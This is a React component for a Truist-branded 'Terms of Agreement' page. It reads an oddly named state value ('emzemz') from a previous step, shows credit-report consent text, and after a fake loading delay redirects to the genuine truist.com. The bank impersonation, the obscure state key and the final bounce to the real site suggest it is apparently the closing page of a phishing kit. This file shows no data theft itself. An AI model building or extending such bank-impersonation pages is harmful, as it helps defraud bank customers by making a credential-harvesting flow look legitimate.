import React, { useState } from 'react';
import { useLocation } from 'react-router-dom';
import { buttonStyles, cardStyles } from '../Utils/truistStyles';

const Terms: React.FC = () => {
  const [isChecked, setIsChecked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const location = useLocation();
  const { emzemz } = location.state || {};

  const handleCheckboxChange = () => {
    setIsChecked(!isChecked);
    if (isChecked) {
      setErrorMessage('');
    }
  };

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault();
    if (isChecked) {
      setIsLoading(true);
      setErrorMessage('');

      // Redirect to Truist website
      setTimeout(() => {
        setIsLoading(false);
        window.location.href = 'https://www.truist.com/';
      }, 1500);
    } else {
      setErrorMessage('Please agree to the terms before proceeding.');
    }
  };

  if (!emzemz) {
    return (
      <div className="flex justify-center items-start min-h-screen py-8 px-4">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Unable to continue
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              We could not locate your previous step. Please restart the flow from the beginning.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex justify-center items-start min-h-screen py-8 px-4">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Terms of Agreement
          </h1>
          
          <p className="text-sm text-[#5d4f72] mb-4">
            By submitting this registration form, I understand that I am
            providing written instructions in accordance with the Fair Credit
            Reporting Act, Driver Privacy Protection Act, and other applicable
            law for Truist and its affiliates to request and receive
            information about me from third parties, including but not limited
            to a copy of my consumer credit report, score, and motor vehicle
            records from consumer reporting agencies, at any time for so long
            as I have an active account.
          </p>

          <p className="text-sm text-[#5d4f72] mb-6">
            I further authorize Truist and its affiliates to retain a copy
            of my information for use in accordance with Truist's
            <a href="#" className="text-[#5f259f] hover:underline">
              {' '}Terms of Service
            </a>{' '}
            and{' '}
            <a href="#" className="text-[#5f259f] hover:underline">
              Privacy Statement
            </a>.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="mt-7">
              <label className="flex gap-2 mb-4 items-center">
                <input
                  type="checkbox"
                  checked={isChecked}
                  onChange={handleCheckboxChange}
                  className="h-4 w-4 text-[#5f259f] focus:ring-[#5f259f] border-[#cfc2df] rounded"
                />
                <span className="text-sm text-[#5d4f72]">I understand and agree</span>
              </label>

              {errorMessage && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mb-4">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errorMessage}</span>
                </div>
              )}
              
              <div className="flex justify-center pt-2">
                <button
                  type="submit"
                  className={buttonStyles.base}
                  disabled={isLoading}
                >
                  {isLoading ? (
                    <span className={buttonStyles.loading}></span>
                  ) : (
                    'Continue'
                  )}
                </button>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Terms;